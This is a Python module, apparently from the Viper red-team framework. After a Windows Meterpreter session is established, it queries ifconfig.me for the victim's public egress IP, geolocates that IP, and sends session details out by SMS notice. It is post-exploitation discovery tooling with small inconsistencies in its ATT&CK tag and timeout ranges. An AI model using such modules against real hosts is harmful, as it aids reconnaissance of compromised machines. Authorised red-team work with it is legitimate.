# -*- coding: utf-8 -*-
# @File  : SimplePostPythonModule.py
# @Date  : 2019/1/12
# @Desc  :

import ipaddress

from Lib.ModuleAPI import *
from Lib.ipgeo import IPGeo


class PostModule(PostMSFPowershellModule):
    NAME_ZH = "获取互联网出口IP"
    DESC_ZH = "模块通过访问https://ifconfig.me/ip接口获取当前Session的互联网出口IP地址.\n" \
              "在使用云函数及CDN等技术隐藏C2的IP地址时,界面中显示Session的地理位置信息不准确,可以使用此模块获取准确信息."

    NAME_EN = "Obtain Internet outbound IP"
    DESC_EN = "Module request https://ifconfig.me/ip to obtain the Internet out IP address of the current session\n" \
              "When using SCF, CDN and other technologies to hide C2, the geographic location information of session is inaccurate.\n" \
              "You can use this module to obtain accurate information"

    REQUIRE_SESSION = True
    MODULETYPE = TAG2TYPE.Discovery
    PLATFORM = ["Windows"]  # 平台
    PERMISSIONS = ["User", "Administrator", ]  # 所需权限
    ATTCK = ["T1068"]  # ATTCK向量
    README = ["https://www.yuque.com/vipersec/module/rd1nie"]
    REFERENCES = ["https://attack.mitre.org/techniques/T1016/001/",
                  "https://ifconfig.me"]
    AUTHOR = ["Viper"]

    OPTIONS = register_options([
        OptionInt(name='timeout',
                  tag_zh="脚本超时时间(秒)", desc_zh="脚本执行的超时时间(5-60)",
                  tag_en="Script timeout (seconds)", desc_en="Script execution timeout time (5-3600)",
                  required=True, default=5),
    ])

    def __init__(self, sessionid, ipaddress, custom_param):
        super().__init__(sessionid, ipaddress, custom_param)

    def check(self):
        """执行前的检查函数"""

        self.set_script("get_public_ip.ps1")

        timeout = self.param("timeout")
        # 检查timeout
        if timeout < 5 or timeout > 60:
            return False, "输入的模块超时时间有误(最小值5,最大值60)", "The entered module timeout time is incorrect (minimum value 6, maximum value 60)"
        self.set_script_timeout(timeout)

        session = Session(self._sessionid)
        if session.is_alive:
            pass
        else:
            return False, "Session不可用", "Session is unavailable"
        if session.is_windows:
            return True, None
        else:
            return False, "此模块只支持Windows的Meterpreter", "This module only supports Meterpreter for Windows"

    def callback(self, status, message, data):
        if status:
            try:
                data = data.strip()
                ipaddress.IPv4Network(data)
            except Exception as E:
                self.log_error("获取信息错误", "Get output error")
                self.log_raw(data)
                return

            locate_zh = IPGeo.get_ip_geo_str(data, "zh-CN")
            locate_en = IPGeo.get_ip_geo_str(data, "en-US")

            self.log_good(f"出口IP: {data}", f"Outbound IP: {data}")
            self.log_good(f"地理位置: {locate_zh}", f"Location: {locate_en}")
            session = Session(self._sessionid)
            Notice.send_sms(
                f"SID: {session.sessionid}\nPlatform:{session.platform}\nInfo:{session.info}\n出口IP: {data}\n地理位置: {locate_zh}",
                f"SID: {session.sessionid}\nPlatform:{session.platform}\nInfo:{session.info}\nOutbound IP: {data}\nLocation: {locate_en}")
            self.log_info("模块执行完成", "Module operation completed")
        else:
            self.log_error("模块执行失败", "Module execution failed")
            self.log_error(message, message)
